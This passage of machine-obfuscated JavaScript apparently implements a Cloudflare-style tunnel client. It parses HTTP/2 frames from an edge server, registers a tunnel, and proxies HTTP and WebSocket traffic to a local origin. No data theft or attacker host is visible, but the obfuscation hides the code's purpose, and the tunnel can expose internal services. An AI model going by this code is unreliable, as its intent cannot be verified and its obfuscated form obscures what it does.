            this[ep(0x191)] -= i, this['streamWindows']['set'](a, d[ep(0x3a8)](h, i)), this[ep(0x55e)](0x0, j, a, k), g += i;
        } while (d['QiMVi'](g, f));
    }
    [a0aY(0x3ac)](a, b) {
        const eq = a0aY, c = {
                'rupUQ': function (d, f) {
                    return d & f;
                }
            };
        if (b > 0x0) {
            const d = Buffer['alloc'](0x4);
            d[eq(0x4c6)](c['rupUQ'](b, 0x7fffffff), 0x0), this['sendFrame'](0x8, 0x0, a, d);
        }
    }
    async [a0aY(0x721)]() {
        const er = a0aY, a = await this[er(0x352)][er(0x7e6)](0x9), b = a['readUIntBE'](0x0, 0x3), c = a[0x3], d = a[0x4], f = a[er(0x8ef)](0x5) & 0x7fffffff, g = await this['reader'][er(0x7e6)](b);
        return [
            c,
            d,
            f,
            g
        ];
    }
    async [a0aY(0x3d7)](a, b, c) {
        const es = a0aY, d = {
                'WIVeE': function (g, h) {
                    return g & h;
                },
                'iIscB': function (g, h) {
                    return g > h;
                },
                'oJVAg': 'invalid\x20HTTP/2\x20padding',
                'Ptasr': function (g, h) {
                    return g & h;
                },
                'rJPFG': function (g, h) {
                    return g & h;
                },
                'Tqnkt': function (g, h) {
                    return g !== h;
                },
                'zhHEY': function (g, h) {
                    return g !== h;
                }
            };
        if (d[es(0x2bf)](a, 0x8)) {
            const g = c[0x0];
            c = c[es(0x6e2)](0x1);
            if (d[es(0x55f)](g, c[es(0x8fc)]))
                throw new Error(d[es(0x872)]);
            c = g ? c[es(0x6e2)](0x0, c[es(0x8fc)] - g) : c;
        }
        d['Ptasr'](a, 0x20) && (c = c['subarray'](0x5));
        const f = [c];
        while (!d[es(0x566)](a, 0x4)) {
            const h = await this[es(0x721)]();
            if (d[es(0x381)](h[0x0], 0x9) || d[es(0x2d5)](h[0x2], b))
                throw new Error(es(0x7ae));
            f['push'](h[0x3]), a = h[0x1];
        }
        return this[es(0x4e3)][es(0x666)](Buffer[es(0x65f)](f));
    }
    [a0aY(0x6be)](a) {
        const et = a0aY, b = {
                'jgUWt': function (c, d) {
                    return c !== d;
                },
                'eYoUx': et(0x174)
            };
        if (b['jgUWt'](this[et(0x1a9)], null))
            return;
        this[et(0x1a9)] = new a0az(this, a, this[et(0x60c)]), this[et(0x520)](a, [[
                et(0x89e),
                b['eYoUx']
            ]]), this[et(0x1a9)][et(0x256)](this['accountTag'], this[et(0x863)], this[et(0x4c1)], this[et(0x78e)]);
    }
    ['updateConfig'](a, b) {
        const eu = a0aY, c = {
                'sfkRW': eu(0x330),
                'LDsGb': function (g, h, i) {
                    return g(h, i);
                },
                'GuJVO': eu(0x174),
                'Lgqjn': eu(0x7be),
                'XuzuV': 'application/json',
                'LZIno': 'content-length',
                'PGtWi': function (g, h) {
                    return g(h);
                }
            };
        let d = 0x0;
        try {
            const g = JSON[eu(0x675)](b['length'] ? b[eu(0x62f)](c[eu(0x925)]) : '{}'), h = c[eu(0x2f1)](parseInt, g[eu(0x1fb)], 0xa);
            !Number[eu(0x517)](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[eu(0x317)](JSON['stringify']({ 'latestAppliedVersion': d }));
        this[eu(0x520)](a, [
            [
                eu(0x89e),
                c[eu(0xc8)]
            ],
            [
                c[eu(0x8bd)],
                c['XuzuV']
            ],
            [
                c['LZIno'],
                c[eu(0x15e)](String, f[eu(0x8fc)])
            ]
        ]), this[eu(0x865)](a, f, !![]);
    }
    [a0aY(0x5b9)](a, b) {
        const ev = a0aY, c = {
                'HfxBg': ev(0x21e),
                'Iujti': ev(0x5ff)
            }, d = c[ev(0x184)][ev(0x3ab)]('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                this[ev(0x20e)](a, b)[ev(0x843)](() => {
                });
                continue;
            case '1':
                if (b[ev(0x810)] === c[ev(0xd5)]) {
                    this[ev(0x6ba)](a, Buffer[ev(0x65f)](b[ev(0x3ed)]));
                    return;
                }
                continue;
            case '2':
                if (b[ev(0x6a3)])
                    return;
                continue;
            case '3':
                if (b[ev(0x7d5)])
                    return;
                continue;
            case '4':
                b[ev(0x7d5)] = !![];
                continue;
            }
            break;
        }
    }
    async [a0aY(0x20e)](a, b) {
        const ew = a0aY, c = {
                'MzLvH': function (d, f, g, h, i, j) {
                    return d(f, g, h, i, j);
                },
                'DHyUB': function (d, f) {
                    return d === f;
                },
                'ClyFv': ew(0x18b),
                'Vhesy': ew(0x74a),
                'MQSnV': ew(0x88b),
                'uotYH': ew(0xf2),
                'NYFqL': ew(0x3b8),
                'XZQIP': function (d, f) {
                    return d === f;
                },
                'YVPaG': function (d, f) {
                    return d === f;
                },
                'yNZJX': ew(0x6f1),
                'tougg': ew(0x7be),
                'umigP': function (d, f) {
                    return d(f);
                },
                'uKqaZ': function (d, f) {
                    return d === f;
                },
                'igflh': function (d, f) {
                    return d(f);
                },
                'tlfxO': ew(0x65e),
                'HtEBp': ew(0x4f1),
                'psoZz': function (d, f) {
                    return d + f;
                },
                'VjXBk': function (d, f) {
                    return d + f;
                },
                'GPndy': ew(0x581),
                'jRtJN': ew(0x421),
                'algdt': '502'
            };
        try {
            const d = await c[ew(0x36d)](a0aC, this[ew(0x401)], b['method'], b[ew(0x7d3)], b['headers'], Buffer[ew(0x65f)](b['body'])), f = [], g = [];
            for (const [k, l] of d[ew(0x7c1)]) {
                const m = k[ew(0x52c)]();
                c[ew(0x3ba)](m, c[ew(0x4db)]) && g['push']([
                    m,
                    l
                ]);
                const n = m[ew(0x49a)](c[ew(0x86a)]) || m[ew(0x49a)](c['MQSnV']) || m['startsWith'](c['uotYH']) || m[ew(0x49a)](':');
                (!n || m === c[ew(0x4da)] || c[ew(0x672)](m, ew(0x810)) || c[ew(0x3b9)](m, c[ew(0x607)])) && f['push']([
                    m,
                    l
                ]);
            }
            if (!f[ew(0x5c7)](([o]) => o === 'content-type')) {
                const o = a0ar(b[ew(0x7d3)]);
                o && f[ew(0x1f0)]([
                    c['tougg'],
                    o
                ]);
            }
            const h = c['umigP'](a0av, f), i = c[ew(0x8d4)](d['status'], 0x65) ? 0xc8 : d[ew(0x5c3)], j = [
                    [
                        ew(0x89e),
                        c['igflh'](String, i)
                    ],
                    ...g,
                    [
                        c[ew(0x1b6)],
                        h
                    ],
                    [
                        'cf-cloudflared-response-meta',
                        c[ew(0x147)]
                    ]
                ];
            this['sendHeaders'](a, j);
            for await (const p of d[ew(0x3ed)]) {
                await this[ew(0x865)](a, p, ![]);
            }
            await this[ew(0x865)](a, Buffer[ew(0x5fd)](0x0), !![]);
        } catch (q) {
            this[ew(0x60c)][ew(0x5be)](c[ew(0x20b)](c[ew(0x48b)](c[ew(0x20f)], a) + c[ew(0x447)], q));
            try {
                this[ew(0x520)](a, [[
                        ':status',
                        c[ew(0x92f)]
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async [a0aY(0x8e9)]() {
        const ex = a0aY, a = {
                'VOQHY': ex(0x716),
                'NcMaO': function (d, f) {
                    return d + f;
                },
                'CReAs': ex(0x670),
                'rrVfQ': function (d, f) {
                    return d < f;
                },
                'rQfTj': function (d, f) {
                    return d - f;
                },
                'DCouQ': function (d, f) {
                    return d + f;
                },
                'bILFR': function (d, f) {
                    return d <= f;
                },
                'neTuU': function (d, f) {
                    return d === f;
                },
                'qJMyU': function (d, f) {
                    return d & f;
                },
                'SRaiW': function (d, f) {
                    return d !== f;
                },
                'YFZWH': function (d, f) {
                    return d === f;
                },
                'ApyBa': function (d, f) {
                    return d + f;
                },
                'ikvRp': function (d, f) {
                    return d === f;
                },
                'GJDxZ': function (d, f) {
                    return d === f;
                },
                'kPIxG': function (d, f) {
                    return d === f;
                },
                'ZifUO': function (d, f) {
                    return d === f;
                }
            }, b = await this['reader']['readExact'](0x18);
        if (!b[ex(0x47e)](Buffer[ex(0x317)](a[ex(0x611)])))
            throw new Error('edge\x20did\x20not\x20send\x20the\x20HTTP/2\x20client\x20preface');
        const c = Buffer[ex(0x5fd)](0x6);
        c[ex(0x2c7)](0x3, 0x0), c[ex(0x4c6)](0x64, 0x2), this['sendFrame'](0x4, 0x0, 0x0, c);
        this[ex(0x239)] && !this[ex(0x665)]['printed'] && (process[ex(0x2db)][ex(0x624)](a[ex(0x5b3)](this[ex(0xdf)], '\x0a')), this[ex(0x665)][ex(0x75a)] = !![]);
        try {
            while (!this[ex(0x42a)]) {
                const [d, f, g, h] = await this[ex(0x721)]();
                if (d === 0x4) {
                    if (!(f & 0x1)) {
                        if (h[ex(0x8fc)] % 0x6)
                            throw new Error(a['CReAs']);
                        for (let i = 0x0; a[ex(0x45f)](i, h[ex(0x8fc)]); i += 0x6) {
                            const j = h[ex(0x4df)](i), k = h[ex(0x8ef)](a['NcMaO'](i, 0x2));
                            if (j === 0x4) {
                                const l = a['rQfTj'](k, 0xffff);
                                for (const m of this[ex(0x59c)][ex(0x3d5)]()) {
                                    this[ex(0x59c)][ex(0x6c4)](m, Math[ex(0x2c1)](0x0, a[ex(0x5d5)](this[ex(0x59c)][ex(0x14d)](m), l)));
                                }
                            } else
                                j === 0x5 && k >= 0x4000 && a[ex(0x4d0)](k, 0xffffff) && (this[ex(0x36a)] = k);
                        }
                        this[ex(0x55e)](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (a[ex(0x20d)](d, 0x6)) {
                    !a[ex(0x48c)](f, 0x1) && this[ex(0x55e)](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (a[ex(0x20d)](d, 0x8)) {
                    if (a[ex(0x6e5)](h[ex(0x8fc)], 0x4))
                        continue;
                    const n = a[ex(0x48c)](h['readUInt32BE'](0x0), 0x7fffffff);
                    a[ex(0x869)](g, 0x0) ? this[ex(0x191)] += n : this[ex(0x59c)][ex(0x6c4)](g, a[ex(0xcb)](this['streamWindows']['get'](g) ?? 0xffff, n));
                    this[ex(0x1f6)]();
                    continue;
                }
                if (a['ikvRp'](d, 0x3)) {
                    this[ex(0x4de)][ex(0x100)](g);
                    continue;
                }
                if (a[ex(0x4c7)](d, 0x7))
                    break;
                if (a[ex(0x8df)](d, 0x1)) {
                    const o = await this[ex(0x3d7)](f, g, h);
                    !this[ex(0x59c)]['has'](g) && this[ex(0x59c)][ex(0x6c4)](g, 0xffff);
                    this[ex(0x876)](g, f, o);
                    continue;
                }
                if (a[ex(0x70f)](d, 0x0)) {
                    this[ex(0x37d)](g, f, h);
                    continue;
                }
            }
        } finally {
            this[ex(0x42a)] = !![], this[ex(0x29c)]();
            for (const p of this[ex(0x4de)][ex(0x4af)]()) {
                p['websocketProxy'] && p[ex(0x47a)][ex(0x48e)]();
            }
            try {
                this['sock'][ex(0x6cf)]();
            } catch (q) {
            }
        }
    }
    [a0aY(0x876)](a, b, c) {
        const ey = a0aY, d = {
                'MvfBt': function (i, j) {
                    return i & j;
                },
                'bpWEo': ':path',
                'DKBVh': ey(0x3b2),
                'ExEHu': function (i, j) {
                    return i === j;
                },
                'yRHUW': ey(0x6d2),
                'VVrVp': ey(0x6a3),
                'tTPoR': function (i, j) {
                    return i(j);
                }
            }, f = {};
        for (const [i, j] of c) {
            i[ey(0x49a)](':') ? f[i] = j : f[i[ey(0x52c)]()] = j;
        }
        const g = (f[a0a4] || '')[ey(0x2eb)]()[ey(0x52c)]();
        if (g === a0a5) {
            this[ey(0x6be)](a);
            d[ey(0x7ef)](b, 0x1) && (this['control'][ey(0x7d5)] = !![]);
            return;
        }
        const h = {
            'method': f[ey(0x642)] || 'GET',
            'path': f[d[ey(0x92d)]] || '/',
            'authority': f[d[ey(0x2e7)]] || '',
            'headers': c[ey(0x3fe)](([k]) => !k['startsWith'](':')),
            'body': [],
            'upgrade': g,
            'websocket': g === ey(0x6a3) || d[ey(0x125)]((f[d['yRHUW']] || '')[ey(0x52c)](), d[ey(0x183)]),
            'ended': d[ey(0x7bc)](Boolean, b & 0x1),
            'finished': ![]
        };
        this['streams'][ey(0x6c4)](a, h);
        if (h[ey(0x6a3)])
            h[ey(0x47a)] = new a0ay(this, a, h, this[ey(0x401)], this[ey(0x60c)]), h[ey(0x47a)]['start']();
        else
            h['ended'] && this[ey(0x5b9)](a, h);
    }
    [a0aY(0x37d)](a, b, c) {
        const ez = a0aY, d = {
                'kLVwc': function (g, h) {
                    return g === h;
                },
                'PEgmV': function (g, h) {
                    return g & h;
                },
                'XUKJn': function (g, h) {
                    return g === h;
                },
                'NRpfQ': function (g, h) {
                    return g(h);
                }
            };
        this[ez(0x3ac)](0x0, c[ez(0x8fc)]), this[ez(0x3ac)](a, c['length']);
        if (this[ez(0x1a9)] !== null && d[ez(0x766)](this[ez(0x1a9)][ez(0x8ae)], a)) {
            this[ez(0x1a9)][ez(0x780)](c);
            d['PEgmV'](b, 0x1) && (this[ez(0x1a9)]['finished'] = !![]);
            return;
        }
        const f = this[ez(0x4de)][ez(0x14d)](a);
        if (d[ez(0x5aa)](f, undefined))
            return;
        if (f[ez(0x47a)] !== undefined) {
            f[ez(0x47a)][ez(0x780)](c, d['NRpfQ'](Boolean, d[ez(0x7c0)](b, 0x1)));
            return;
        }
        c[ez(0x8fc)] && f['body'][ez(0x1f0)](c), d[ez(0x7c0)](b, 0x1) && (f[ez(0x348)] = !![], this['requestFinished'](a, f));
    }
}
class a0ay {
    constructor(a, b, c, d, f) {
        const eA = a0aY;
        this[eA(0x3b8)] = a, this[eA(0x8ae)] = b, this['request'] = c, this[eA(0x401)] = d, this['log'] = f, this[eA(0x84d)] = [], this[eA(0x57b)] = [], this[eA(0x42a)] = ![], this[eA(0x585)] = null;
    }
    [a0aY(0x256)]() {
        const eB = a0aY;
        this[eB(0x8e9)]()[eB(0x843)](() => {
        });
    }
    [a0aY(0x780)](a, b = ![]) {
        const eC = a0aY;
        a['length'] && this['queue'][eC(0x1f0)](a), b && this[eC(0x84d)][eC(0x1f0)](null), this[eC(0x4a4)]();
    }
    [a0aY(0x48e)]() {
        const eD = a0aY, a = {
                'klJRV': function (b, c) {
                    return b !== c;
                }
            };
        if (this[eD(0x42a)])
            return;
        this[eD(0x42a)] = !![], this['_wake']();
        if (a['klJRV'](this[eD(0x585)], null))
            try {
                this[eD(0x585)][eD(0x6cf)]();
            } catch (b) {
            }
    }
    [a0aY(0x4a4)]() {
        const eE = a0aY, a = {
                'jScFh': function (b) {
                    return b();
                }
            };
        for (const b of this[eE(0x57b)]) {
            a[eE(0x1ca)](b);
        }
        this[eE(0x57b)] = [];
    }
    async [a0aY(0x605)]() {
        const eF = a0aY;
        while (!this[eF(0x42a)]) {
            if (this[eF(0x84d)][eF(0x8fc)])
                return this[eF(0x84d)][eF(0x773)]();
            await new Promise(a => this[eF(0x57b)][eF(0x1f0)](a));
        }
        return null;
    }
    async ['run']() {
        const eG = a0aY, a = {
                'MHoAR': function (b, c) {
                    return b(c);
                },
                'CKhYe': function (b, c) {
                    return b === c;
                },
                'mXCYA': eG(0x18b),
                'lebic': eG(0x74a),
                'DerLi': 'cf-cloudflared-',
                'sqFTG': eG(0xf2),
                'qLCJR': function (b, c) {
                    return b === c;
                },
                'CFJrm': eG(0x3b8),
                'MLDbV': 'sec-websocket-accept',
                'mOgiP': function (b, c) {
                    return b(c);
                },
                'CysMQ': eG(0x681),
                'dQDoQ': eG(0x4f1),
                'KoRjL': function (b, c) {
                    return b + c;
                },
                'Elnjt': function (b, c) {
                    return b + c;
                },
                'VWYOa': function (b, c) {
                    return b + c;
                },
                'XiqzP': eG(0x4ec),
                'EKUEE': eG(0x226),
                'arxqB': eG(0x89e)
            };
        try {
            this[eG(0x585)] = await a[eG(0x820)](a0aA, this[eG(0x401)]), this[eG(0x1c7)]();
            const b = await a0aD(this[eG(0x585)]), c = [], d = [];
            for (const [i, j] of b['headers']) {
                const k = i[eG(0x52c)]();
                a['CKhYe'](k, a[eG(0xe6)]) && d['push']([
                    k,
                    j
                ]);
                const l = k[eG(0x49a)](a[eG(0x40b)]) || k[eG(0x49a)](a[eG(0x151)]) || k['startsWith'](a[eG(0x916)]) || k[eG(0x49a)](':');
                (!l || a[eG(0xcc)](k, a['CFJrm']) || a[eG(0x5b2)](k, eG(0x810)) || a[eG(0xcc)](k, a[eG(0x868)])) && c[eG(0x1f0)]([
                    k,
                    j
                ]);
            }
            const f = a0av(c), g = b[eG(0x5c3)] === 0x65 ? 0xc8 : b[eG(0x5c3)], h = [
                    [
                        ':status',
                        a[eG(0x63a)](String, g)
                    ],
                    ...d,
                    [
                        eG(0x65e),
                        f
                    ],
                    [
                        a[eG(0x108)],
                        a[eG(0x6c8)]
                    ]
                ];
            this['connection']['sendHeaders'](this[eG(0x8ae)], h), this['writeToOrigin']()['catch'](() => {
            }), await this[eG(0x673)](b[eG(0x243)]);
        } catch (m) {
            this[eG(0x60c)][eG(0x5be)](a['KoRjL'](a['Elnjt'](a[eG(0x526)](a[eG(0x7a7)], this['streamId']), a[eG(0x71c)]), m));
            try {
                this['connection'][eG(0x520)](this[eG(0x8ae)], [[
                        a[eG(0x519)],
                        eG(0x11d)
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this[eG(0x48e)]();
        }
    }
    async [a0aY(0x673)](a) {
        const eH = a0aY;
        a[eH(0x8fc)] && await this[eH(0x3b8)]['sendData'](this['streamId'], a, ![]);
        for await (const b of this[eH(0x585)]) {
            if (this['stopped'])
                break;
            await this['connection'][eH(0x865)](this[eH(0x8ae)], b, ![]);
        }
        !this['stopped'] && await this[eH(0x3b8)][eH(0x865)](this[eH(0x8ae)], Buffer['alloc'](0x0), !![]);
    }
    async [a0aY(0x453)]() {
        const eI = a0aY, a = {
                'cHGkM': function (b, c) {
                    return b === c;
                }
            };
        while (!this[eI(0x42a)]) {
            const b = await this[eI(0x605)]();
            if (a[eI(0x268)](b, null))
                return;
            try {
                this[eI(0x585)][eI(0x624)](b);
            } catch (c) {
                this[eI(0x42a)] = !![];
                return;
            }
        }
    }
    [a0aY(0x1c7)]() {
        const eJ = a0aY, a = {
                'rDVco': function (i, j) {
                    return i + j;
                },
                'qVWss': function (i, j) {
                    return i + j;
                },
                'SkXQG': function (i, j) {
                    return i === j;
                },
                'CUXyr': eJ(0x179),
                'BUsQi': eJ(0x3b8),
                'ApVBL': eJ(0x810),
                'jxxPC': function (i, j) {
                    return i === j;
                },
                'JdWlm': eJ(0x18b),
                'UyGji': 'sec-websocket-key',
                'zwpXn': eJ(0x401),
                'wJTCT': function (i, j) {
                    return i + j;
                },
                'xTsgd': eJ(0x5af),
                'mQAIC': function (i, j) {
                    return i + j;
                },
                'JOmvl': 'Origin:\x20https://',
                'YLAtf': eJ(0x3b0),
                'dMlWO': eJ(0x262),
                'FVbHr': eJ(0x651),
                'AmSpm': eJ(0x6b6),
                'MIUqT': eJ(0x602),
                'ZIURn': eJ(0x3ef)
            }, b = new URL(this[eJ(0x401)]), c = this['request'][eJ(0x7d3)][eJ(0x49a)]('/') ? this['request']['path'] : a[eJ(0x90d)]('/', this[eJ(0x713)][eJ(0x7d3)]), d = [a[eJ(0x3b5)](eJ(0x752) + c, eJ(0x1db))];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this[eJ(0x713)][eJ(0x7c1)]) {
            const k = i['toLowerCase']();
            if (a['SkXQG'](k, a['CUXyr']) || k === a[eJ(0x50e)] || a[eJ(0x68e)](k, a[eJ(0x7ff)]) || a[eJ(0x928)](k, a[eJ(0x783)]) || a[eJ(0x68e)](k, eJ(0x2f9)))
                continue;
            if (a[eJ(0x68e)](k, a[eJ(0x60f)]))
                f = !![];
            else {
                if (k === 'sec-websocket-version')
                    g = !![];
                else
                    k === a['zwpXn'] && (h = !![]);
            }
            d[eJ(0x1f0)](a[eJ(0x57d)](i, ':\x20') + j);
        }
        d[eJ(0x1f0)](a[eJ(0x57d)](a['xTsgd'], b[eJ(0x179)])), !h && this[eJ(0x713)][eJ(0x50f)] && d[eJ(0x1f0)](a['mQAIC'](a[eJ(0x6ce)], this['request']['authority'])), !f && d[eJ(0x1f0)](a['mQAIC'](a[eJ(0x259)], a0k[eJ(0x6de)](0x10)[eJ(0x62f)](a[eJ(0x91e)]))), !g && d[eJ(0x1f0)](a[eJ(0x373)]), d[eJ(0x1f0)](a['AmSpm']), d[eJ(0x1f0)](a[eJ(0x493)]), this[eJ(0x585)][eJ(0x624)](Buffer[eJ(0x317)](a[eJ(0x57d)](d[eJ(0x2e0)]('\x0d\x0a'), a[eJ(0x738)]), 'latin1'));
    }
}
class a0az {
    constructor(a, b, c) {
        const eK = a0aY, d = { 'sNIPZ': eK(0x222) }, f = d['sNIPZ'][eK(0x3ab)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this['buffer'] = Buffer[eK(0x5fd)](0x0);
                continue;
            case '1':
                this[eK(0x8ae)] = b;
                continue;
            case '2':
                this['log'] = c;
                continue;
            case '3':
                this[eK(0x7d5)] = ![];
                continue;
            case '4':
                this[eK(0x3b8)] = a;
                continue;
            }
            break;
        }
    }
    [a0aY(0x256)](a, b, c, d) {
        const eL = a0aY, f = {
                'KXQKf': function (g, h) {
                    return g(h);
                }
            };
        this[eL(0x3b8)]['sendData'](this[eL(0x8ae)], f[eL(0x2e3)](a0ak, 0x0), ![]), this[eL(0x3b8)][eL(0x865)](this['streamId'], a0al(0x1, 0x0, a, b, c, d), ![]);
    }
    [a0aY(0x780)](a) {
        const eM = a0aY, b = {
                'FAkFl': function (f, g) {
                    return f(g);
                },
                'uTWZe': function (f, g) {
                    return f + g;
                },
                'WIIQq': eM(0x562),
                'zOYtz': 'tunnel\x20registration\x20failed:\x20',
                'REogI': eM(0x854),
                'ggUnc': function (f, g) {
                    return f + g;
                },
                'qPBTS': eM(0x1ac)
            };
        this[eM(0x10a)] = this[eM(0x10a)]['length'] ? Buffer['concat']([
            this[eM(0x10a)],
            a
        ]) : a;
        let c, d;
        [c, d] = a0am(this[eM(0x10a)]), this['buffer'] = d;
        for (const f of c) {
            try {
                const g = b[eM(0x346)](a0ap, f);
                g['ok'] ? (this[eM(0x60c)][eM(0x5ac)](b[eM(0x217)](b[eM(0x35a)], g[eM(0x25e)] || eM(0x111))), this['connection'][eM(0x283)] = !![]) : (this[eM(0x60c)][eM(0x5be)](b['uTWZe'](b[eM(0x21a)], g[eM(0x1e9)] || b[eM(0x68b)])), this[eM(0x3b8)]['registrationFailed'] = !![], this[eM(0x3b8)][eM(0x42a)] = !![]);
            } catch (h) {
                this[eM(0x60c)]['debug'](b[eM(0x574)](b[eM(0x5ab)], h));
            }
        }
    }
}
function a0aA(a) {
    const eN = a0aY, b = {
            'LRKkW': function (c, d, f) {
                return c(d, f);
            },
            'BZQvO': function (c, d, f) {
                return c(d, f);
            },
            'wbmIk': eN(0x1e9),
            'xvMTh': eN(0x280),
            'qBXho': '2|0|3|4|1',
            'SuGie': function (c, d) {
                return c(d);
            },
            'FthOb': eN(0x4b8),
            'CSwbo': eN(0x7fa),
            'HzHxv': 'https:',
            'tejlI': function (c, d) {
                return c(d);
            },
            'OJNIy': function (c, d) {
                return c === d;
            },
            'cetPS': 'connect'
        };
    return new Promise((c, d) => {
        const eO = eN, f = {
                'uqApb': b['qBXho'],
                'eVbxE': function (n, o) {
                    return n(o);
                },
                'fztgl': b[eO(0xe2)],
                'mEWGZ': function (n, o, p) {
                    return n(o, p);
                }
            };
        let g;
        try {
            g = new URL(a);
        } catch (n) {
            b[eO(0x576)](d, new Error(b[eO(0x5e4)]));
            return;
        }
        if (![
                b['CSwbo'],
                b[eO(0x14b)]
            ][eO(0x27e)](g[eO(0x5cb)]) || !g[eO(0x65c)]) {
            b[eO(0x680)](d, new Error(b[eO(0x5e4)]));
            return;
        }
        const h = b[eO(0x77f)](g[eO(0x5cb)], b[eO(0x14b)]), i = g[eO(0x4c8)] || (h ? 0x1bb : 0x50), j = a0i[eO(0x67e)]({
                'host': g['hostname'],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const eP = eO, q = f['uqApb'][eP(0x3ab)]('|');
                let r = 0x0;
                while (!![]) {
                    switch (q[r++]) {
                    case '0':
                        k = !![];
                        continue;
                    case '1':
                        f[eP(0x289)](o, p);
                        continue;
                    case '2':
                        if (k)
                            return;
                        continue;
                    case '3':
                        j[eP(0x29b)](f['fztgl'], m);
                        continue;
                    case '4':
                        j[eP(0x7e0)](0x0);
                        continue;
                    }
                    break;
                }
            }, m = o => {
                const eQ = eO;
                !k && b[eQ(0x444)](l, d, o);
            };
        j['on'](b['wbmIk'], m), j[eO(0x7e0)](0x7530, () => j[eO(0x6cf)](new Error(eO(0x6fe)))), j['on'](b[eO(0x13d)], () => {
            const eR = eO, o = {
                    'gdiCW': function (q, r, s) {
                        return q(r, s);
                    }
                };
            if (!h) {
                b[eR(0x4fd)](l, c, j);
                return;
            }
            const p = a0j['connect']({
                'socket': j,
                'servername': g[eR(0x65c)]
            });
            p['on'](b[eR(0xe2)], q => {
                !k && o['gdiCW'](l, d, q);
            }), p['on'](b[eR(0x1b5)], () => {
                const eS = eR;
                f[eS(0x8d2)](l, c, p);
            });
        });
    });
}
function a0aB(a) {
    const eT = a0aY, b = {
            'VDvzz': function (d, f) {
                return d < f;
            },
            'jqZNj': function (d, f) {
                return d + f;
            }
        }, c = [];
    for (let d = 0x0; b[eT(0x90b)](d, a[eT(0x3be)][eT(0x8fc)]); d += 0x2) {
        c['push']([
            a['rawHeaders'][d],
            a[eT(0x3be)][b[eT(0x325)](d, 0x1)]
        ]);
    }
    return c;
}
function a0aC(a, b, c, d, f) {
    const eU = a0aY, g = {
            'qoZLK': function (h, i) {
                return h(i);
            },
            'nJfBm': function (h, i) {
                return h(i);
            },
            'rdmuA': function (h, i) {
                return h(i);
            },
            'qQtqB': eU(0x4b8),
            'MHvfY': eU(0x7fa),
            'fjQui': eU(0x479),
            'ocbPv': function (h, i) {
                return h === i;
            },
            'mlIyA': eU(0x179),
            'SRElm': function (h, i) {
                return h === i;
            },
            'NZpQA': 'connection',
            'UhdFs': eU(0x2f9),
            'FbZgG': function (h, i) {
                return h === i;
            },
            'wrSXD': eU(0x18b),
            'vUOZz': eU(0x53d),
            'CFQCg': eU(0x6a8),
            'znKrI': function (h, i) {
                return h(i);
            },
            'ikOZh': 'error'
        };
    return new Promise((h, i) => {
        const eV = eU, j = {
                'KNatI': function (r, s) {
                    return g['qoZLK'](r, s);
                },
                'JSIgp': function (r, s) {
                    return g['nJfBm'](r, s);
                }
            };
        let k;
        try {
            k = new URL(a);
        } catch (r) {
            g[eV(0x15f)](i, new Error(g[eV(0x8a6)]));
            return;
        }
        if (![
                g[eV(0x20a)],
                g[eV(0x303)]
            ][eV(0x27e)](k[eV(0x5cb)]) || !k[eV(0x65c)]) {
            g[eV(0x2d1)](i, new Error(g[eV(0x8a6)]));
            return;
        }
        const l = g[eV(0x2c0)](k[eV(0x5cb)], g[eV(0x303)]), m = k[eV(0x4c8)] || (l ? 0x1bb : 0x50), n = {};
        for (const [s, t] of d) {
            const u = s[eV(0x52c)]();
            if (g[eV(0x2c0)](u, g[eV(0x70d)]) || g[eV(0x654)](u, g[eV(0x190)]) || u === g[eV(0x805)] || g[eV(0x206)](u, g[eV(0x18e)]))
                continue;
            n[s] = t;
        }
        n[g[eV(0x4f3)]] = k[eV(0x179)];
        f['length'] && (n[g[eV(0x36f)]] = g[eV(0x7fb)](String, f['length']));
        const o = c[eV(0x49a)]('/') ? c : '/' + c, p = l ? a0h : a0g, q = p[eV(0x713)]({
                'hostname': k['hostname'],
                'port': m,
                'path': o,
                'method': b,
                'headers': n,
                'timeout': 0x7530
            }, v => {
                const eW = eV;
                j[eW(0x3c2)](h, {
                    'status': v[eW(0x14e)],
                    'headers': j[eW(0x56f)](a0aB, v),
                    'body': v
                });
            });
        q['on'](g[eV(0x2e2)], v => i(v)), q[eV(0x233)](f[eV(0x8fc)] ? f : undefined);
    });
}
function a0aD(a) {
    const eX = a0aY, b = {
            'Higod': '\x0d\x0a\x0d\x0a',
            'BmRXM': function (c) {
                return c();
            },
            'Yhyse': 'malformed\x20HTTP/1.1\x20response\x20status',
            'zvQgK': function (c, d) {
                return c < d;
            },
            'quQzI': function (c, d) {
                return c + d;
            },
            'ZqtuQ': function (c, d) {
                return c(d);
            },
            'HWjgy': function (c, d) {
                return c + d;
            },
            'hoAsK': function (c) {
                return c();
            },
            'FDMSa': 'data',
            'zkjAR': eX(0x233),
            'VoiDt': eX(0x4a5),
            'oqTcE': function (c, d) {
                return c(d);
            },
            'NlLLC': eX(0x1e9)
        };
    return new Promise((c, d) => {
        const eY = eX, f = {
                'xztTM': b[eY(0x2a7)],
                'oIFTx': b[eY(0x423)],
                'Wuvqg': b[eY(0x604)],
                'Azdbn': function (l) {
                    return l();
                },
                'ZwbZX': function (l, m) {
                    const eZ = eY;
                    return b[eZ(0x831)](l, m);
                },
                'FYmXJ': eY(0x6fb)
            };
        let g = Buffer[eY(0x5fd)](0x0);
        const h = () => {
                const f0 = eY;
                a[f0(0x29b)](f[f0(0x24a)], i), a[f0(0x29b)](f0(0x1e9), j), a[f0(0x29b)](f[f0(0x6c9)], k), a['removeListener'](f[f0(0x6b1)], k);
            }, i = l => {
                const f1 = eY;
                g = g[f1(0x8fc)] ? Buffer[f1(0x65f)]([
                    g,
                    l
                ]) : l;
                const m = g[f1(0x6c5)](b[f1(0x40a)]);
                if (m < 0x0)
                    return;
                b[f1(0x1a5)](h);
                const n = g[f1(0x6e2)](0x0, m)['toString'](f1(0x7f7)), o = n[f1(0x3ab)]('\x0d\x0a'), p = o[0x0][f1(0x3ab)]('\x20'), q = parseInt(p[0x1], 0xa);
                if (!Number[f1(0x2f3)](q)) {
                    d(new Error(b[f1(0x2bd)]));
                    return;
                }
                const r = [];
                for (let s = 0x1; b[f1(0x146)](s, o[f1(0x8fc)]); s++) {
